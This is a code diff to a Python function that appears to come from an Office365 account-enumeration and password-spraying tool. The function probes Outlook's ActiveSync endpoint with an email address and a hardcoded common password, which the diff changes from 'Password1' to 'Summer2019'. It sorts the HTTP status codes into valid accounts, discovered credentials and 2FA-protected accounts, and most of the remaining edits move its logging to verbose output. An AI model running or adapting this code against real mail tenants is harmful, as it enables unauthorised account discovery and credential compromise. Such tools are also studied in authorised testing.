@@ -3,36 +3,36 @@ import requests
 
 def validate(email):
 	try:
-		password='Password1'
+		password='Summer2019'
 		url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
 		headers = {"MS-ASProtocolVersion": "14.0"}
 		auth = (email, password)
 
 		try:
+			logger.verbose('Attempting to validate %s' % logger.YELLOW(email))
 			r = requests.options(url, headers=headers, auth=auth)
 			status = r.status_code
 		except:
-			logger.red('Unable to connect to [%s]' % logger.RED(url))
+			logger.verbose('Unable to connect to [%s]' % logger.RED(url))
 			quit()
 
 		if status == 401:
-			logger.green('Successfully validated %s' % logger.GREEN(email))
+			logger.verbose('Successfully validated %s' % logger.GREEN(email))
 			return True
 
 		elif status == 404:
-			if r.headers.get("X-CasErrorCode") == "emailNotFound":
-				logger.red('Could not validate %s' % logger.RED(email))
-				return False
+			logger.verbose('Could not validate %s' % logger.RED(email))
+			return False
 
 		elif status == 403:
-			logger.green('Found credentials: %s:%s (2FA)' % (logger.GREEN(email),logger.GREEN(password)))
+			logger.verbose('Found credentials: %s:%s (2FA)' % (logger.GREEN(email),logger.GREEN(password)))
 			return [True,password]
 
 		elif status == 200:
-			logger.green('Found credentials: %s:%s' % (logger.GREEN(email),logger.GREEN(password)))
+			logger.verbose('Found credentials: %s:%s' % (logger.GREEN(email),logger.GREEN(password)))
 			return [True,password]
 		else:
-			logger.red('Got HTTP Status Response %s. Unexected, skipping.')
+			logger.verbose('Got HTTP Status Response %s. Unexpected, skipping.' % logger.RED(str(status)))
 			return None
 
 	except KeyboardInterrupt:
